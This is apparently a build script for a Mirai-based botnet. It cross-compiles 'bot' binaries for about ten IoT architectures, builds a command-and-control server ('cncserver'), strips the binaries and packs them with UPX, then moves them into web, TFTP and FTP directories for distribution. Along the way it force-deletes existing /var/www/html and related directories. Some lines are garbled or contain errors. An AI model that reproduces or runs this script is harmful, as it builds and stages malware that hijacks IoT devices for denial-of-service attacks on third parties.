export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords


                                                                                                                                                                                                                                                                                                                                                                                       
rm -rf ~/release
rm -rf /var/www/html
rm -rf /var/lib/tftpboot
rm -rf /var/ftp
rm -rf /var/www/html/bins

mkdir /var/ftp
mkdir /var/lib/tftpboot
mkdir /var/www/html
mkdir /var/www/html/bins
mkdir ~/release
go mod init main
go mod tidy
go build -o cncserver cnc/*.go

echo "Building - debug"
compile_bot i586 VRx86 "-static"
compile_bot mips VRmips "-static"
compile_bot mipsel VRmpsl "-static"
compile_bot armv4l VRarm "-static"
compile_bot armv5l VRarm5n
compile_bot armv6l VRarm7 "-static"
compile_bot powerpc VRppc "-static"
compile_bot sparc VRspc "-static"
compile_bot m68k VRm68k "-static"
compile_bot sh4 VRsh4 "-static"
compile_bot i586 dbg "-static -DDEBUG"
cd release
apt install upx -y upx --ultra-brute release/*
mv VRx86 VRmips VRmpsl VRarm VRarm5n VRarm7 VRppc VRspc VRm68k sVRh4 /var/www/html/bins
wget https://github.com/upx/upx/releases/download/v3.94/upx-3.94-i386_linux.tar.xz
tar -xvf *.xz
mv upx*/upx .
./upx --ultra-brute /var/www/html/bins/*
./upx --ultra-brute /var/lib/tftpboot/*
./upx --ultra-brute /var/ftp/*
rm -rf upx*

touch /var/www/html/index.html
touch /var/www/html/bins/index.html
